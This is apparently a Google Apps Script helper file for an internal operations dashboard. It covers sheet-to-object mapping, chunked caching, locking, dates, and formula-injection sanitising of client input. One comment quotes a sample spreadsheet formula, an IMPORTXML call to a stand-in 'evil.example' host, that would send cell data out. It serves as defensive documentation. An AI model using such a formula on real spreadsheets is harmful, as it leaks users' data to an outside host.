/**
 * Shared helpers: sheet<->object mapping, date formatting, UUIDs, and a lock wrapper
 * for CRUD write safety (LEAVE/RTO/PROJECTS writes race with manual edits + concurrent requests).
 */

const TIMEZONE = 'Asia/Manila';

/** Reads a sheet's header row (row 1) and maps every data row into an object keyed by header name. */
function sheetToObjects_(sheet) {
  const lastRow = sheet.getLastRow();
  const lastCol = sheet.getLastColumn();
  if (lastRow < 2) return [];

  const headers = sheet.getRange(1, 1, 1, lastCol).getValues()[0];
  const values = sheet.getRange(2, 1, lastRow - 1, lastCol).getValues();

  return values
    .filter((row) => row.some((cell) => cell !== '' && cell !== null))
    .map((row, i) => {
      const obj = { _row: i + 2 }; // 1-indexed sheet row, for in-place updates
      headers.forEach((h, colIdx) => { obj[h] = row[colIdx]; });
      return obj;
    });
}

/**
 * sheetToObjects_ fronted by CacheService, keyed by sheet ID. METRICS_DAILY and
 * METRICS_BY_ASSIGNEE_MONTHLY are only written by the ~2h aggregateAllTeams trigger (which calls
 * invalidateSheetCache_ when it's done), but every dashboard filter click (range/period/
 * prev-next) re-reads the full sheet via getValues() — the slowest part of the request. A short
 * TTL cache lets repeated filter changes within the window skip straight to the in-memory rows
 * instead of re-hitting the Sheets service.
 */
const SHEET_CACHE_TTL_SECONDS = 600;
const CACHE_CHUNK_SIZE = 90000; // CacheService caps each value at 100KB; leave headroom for JSON escaping.

function sheetToObjectsCached_(sheet) {
  const cache = CacheService.getScriptCache();
  const cacheKey = 'sheetObjects_' + sheet.getSheetId();

  const cached = readChunkedCache_(cache, cacheKey);
  if (cached !== null) return JSON.parse(cached);

  const rows = sheetToObjects_(sheet);
  writeChunkedCache_(cache, cacheKey, JSON.stringify(rows), SHEET_CACHE_TTL_SECONDS);
  return rows;
}

/** Invalidate after any write to a cached sheet so readers never see stale rows past the TTL. */
function invalidateSheetCache_(sheet) {
  const cache = CacheService.getScriptCache();
  const cacheKey = 'sheetObjects_' + sheet.getSheetId();
  const countStr = cache.get(cacheKey + '_count');
  if (countStr === null) return;
  const keys = [cacheKey + '_count'];
  for (let i = 0; i < Number(countStr); i++) keys.push(cacheKey + '_' + i);
  cache.removeAll(keys);
}

/**
 * Busts every sheetToObjectsCached_-fronted cache: METRICS_DAILY, METRICS_BY_ASSIGNEE_MONTHLY,
 * and every RAW_<team>_<year> tab for every active team. aggregateAllTeams already does the first
 * two automatically after each run; this is the manual, on-demand version of the same thing,
 * exposed via the 'refresh-cache' route so the dashboard's "Refresh Data" button can force a
 * genuinely fresh read instead of waiting out the 10-minute TTL.
 */
function invalidateAllCaches_() {
  const jiraData = getJiraDataSpreadsheet_();
  ['METRICS_DAILY', 'METRICS_BY_ASSIGNEE_MONTHLY'].forEach((name) => {
    const sheet = jiraData.getSheetByName(name);
    if (sheet) invalidateSheetCache_(sheet);
  });
  getActiveTeamsConfig_().forEach((team) => {
    getAllRawYearsForTeam_(team.team_key).forEach((year) => {
      const sheet = jiraData.getSheetByName(`RAW_${team.team_key}_${year}`);
      if (sheet) invalidateSheetCache_(sheet);
    });
  });
  return { invalidatedAt: nowIso_() };
}

function readChunkedCache_(cache, key) {
  const countStr = cache.get(key + '_count');
  if (countStr === null) return null;
  const count = Number(countStr);
  const parts = [];
  for (let i = 0; i < count; i++) {
    const part = cache.get(key + '_' + i);
    if (part === null) return null; // partial expiry mid-window — treat as a miss
    parts.push(part);
  }
  return parts.join('');
}

function writeChunkedCache_(cache, key, value, ttlSeconds) {
  const entries = {};
  let chunkCount = 0;
  for (let i = 0; i < value.length; i += CACHE_CHUNK_SIZE) {
    entries[key + '_' + chunkCount] = value.slice(i, i + CACHE_CHUNK_SIZE);
    chunkCount++;
  }
  entries[key + '_count'] = String(chunkCount);
  cache.putAll(entries, ttlSeconds);
}

/**
 * Per-execution cache of each sheet's header row. objectToSheetRow_/appendObjectToSheet_/
 * updateSheetRow_ are all called once per RECORD from every sync/aggregation loop in this
 * project (JiraSync, Aggregation, TicketProjectApi, InitiativesSync) — each call was re-reading
 * the same header row from Sheets, doubling the Sheets API call volume of every one of those
 * loops for no reason (found via a full-codebase performance audit; this project has hit Sheets/
 * script-runtime quota exhaustion before, see Aggregation.gs's own historical-timeout comment).
 * A plain top-level var is exactly the pattern getMetricsDailyIndex_/getRawTicketIndex_ already
 * use for the equivalent row-lookup problem — it lives only for the current execution and is
 * never persisted, so a header added by some OTHER function earlier in the same execution won't
 * retroactively appear here; that's an accepted, narrow tradeoff since header-adding migrations
 * in this project run as their own standalone one-off functions, never interleaved with a sync
 * loop that also writes rows in the same execution.
 */
var HEADER_ROW_CACHE_ = {};

function getSheetHeaders_(sheet) {
  var id = sheet.getSheetId();
  if (!HEADER_ROW_CACHE_[id]) {
    HEADER_ROW_CACHE_[id] = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
  }
  return HEADER_ROW_CACHE_[id];
}

/**
 * Blocks Google Sheets from interpreting a client-supplied string as a live formula. A value
 * starting with =, +, -, or @ is prefixed with a literal apostrophe — the same character Sheets'
 * own UI uses to force a cell to plain text — so e.g. a feedback/notes field containing
 * '=IMPORTXML("https://evil.example/?d="&A1,"//a")' is stored and displayed as that literal
 * string instead of executing. Found via a full-codebase security audit: every *Api.gs create/
 * update route (IncidentsApi, LeaveApi, RtoApi, ProjectsApi, ProgressApi, TasksApi) writes
 * client-supplied string fields straight into a row via these two functions with no check.
 */
function sanitizeSheetValue_(value) {
  if (typeof value !== 'string' || !value.length) return value;
  var first = value.charAt(0);
  if (first === '=' || first === '+' || first === '-' || first === '@') {
    return "'" + value;
  }
  return value;
}

/** Converts an object into a row array matching the sheet's current header order. */
function objectToSheetRow_(sheet, obj) {
  const headers = getSheetHeaders_(sheet);
  return headers.map((h) => (h in obj ? sanitizeSheetValue_(obj[h]) : ''));
}

function appendObjectToSheet_(sheet, obj) {
  sheet.appendRow(objectToSheetRow_(sheet, obj));
}

/** Overwrites an existing row (1-indexed) with the given object's values. */
function updateSheetRow_(sheet, rowIndex, obj) {
  const headers = getSheetHeaders_(sheet);
  const row = headers.map((h, i) => (h in obj ? sanitizeSheetValue_(obj[h]) : sheet.getRange(rowIndex, i + 1).getValue()));
  sheet.getRange(rowIndex, 1, 1, headers.length).setValues([row]);
}

function deleteSheetRow_(sheet, rowIndex) {
  sheet.deleteRow(rowIndex);
}

/** Runs `fn` under a document lock (max 30s wait) so concurrent writes don't clobber each other. */
function withLock_(fn) {
  const lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try {
    return fn();
  } finally {
    lock.releaseLock();
  }
}

function uuid_() {
  return Utilities.getUuid();
}

function nowIso_() {
  return Utilities.formatDate(new Date(), TIMEZONE, "yyyy-MM-dd'T'HH:mm:ssXXX");
}

function toIsoDate_(date) {
  return Utilities.formatDate(date, TIMEZONE, 'yyyy-MM-dd');
}

/**
 * Coerces a sheet cell (a Date object, an ISO timestamp string, or a plain 'yyyy-MM-dd')
 * to a plain 'yyyy-MM-dd' string in Manila time — so date-only fields never leak a time
 * component or an off-by-one from UTC serialization. Blank stays blank.
 */
function toDisplayDate_(value) {
  if (value === '' || value === null || value === undefined) return '';
  const d = (value instanceof Date) ? value : new Date(value);
  return isNaN(d.getTime()) ? String(value) : toIsoDate_(d);
}

function monthLabel_(date) {
  return Utilities.formatDate(date, TIMEZONE, 'yyyy-MM');
}

/** Shared rounding helpers — used by both Aggregation.gs and MetricsApi.gs. */
function round2_(n) { return Math.round(n * 100) / 100; }
function round4_(n) { return Math.round(n * 10000) / 10000; }

/** Every RAW_<teamKey>_<year> tab that actually exists, regardless of a requested period's range. */
function getAllRawYearsForTeam_(teamKey) {
  const prefix = `RAW_${teamKey}_`;
  return getJiraDataSpreadsheet_().getSheets()
    .map((s) => s.getName())
    .filter((name) => name.indexOf(prefix) === 0 && /^\d{4}$/.test(name.slice(prefix.length)))
    .map((name) => Number(name.slice(prefix.length)));
}

/** All rows across every existing RAW_<teamKey>_<year> tab — for reports needing a live, non-period-scoped scan. */
function getAllRawRowsForTeam_(teamKey) {
  const ss = getJiraDataSpreadsheet_();
  return getAllRawYearsForTeam_(teamKey).reduce((acc, year) => {
    const sheet = ss.getSheetByName(`RAW_${teamKey}_${year}`);
    return sheet ? acc.concat(sheetToObjectsCached_(sheet)) : acc;
  }, []);
}

/**
 * Best-effort ops email (failures and completion notices) — swallows its own errors so
 * a broken mail quota never masks the original failure being reported. Set an
 * ALERT_EMAIL script property to target a distribution list instead of the script owner.
 */
function sendAlertEmail_(subject, body) {
  try {
    const email = PropertiesService.getScriptProperties().getProperty('ALERT_EMAIL')
      || Session.getEffectiveUser().getEmail();
    MailApp.sendEmail(email, `[PlatOpsDashboard] ${subject}`, String(body && body.stack ? body.stack : body));
  } catch (mailErr) {
    Logger.log(`sendAlertEmail_ failed to send email: ${mailErr}`);
  }
}

function notifyFailure_(subject, err) {
  sendAlertEmail_(subject, err);
}
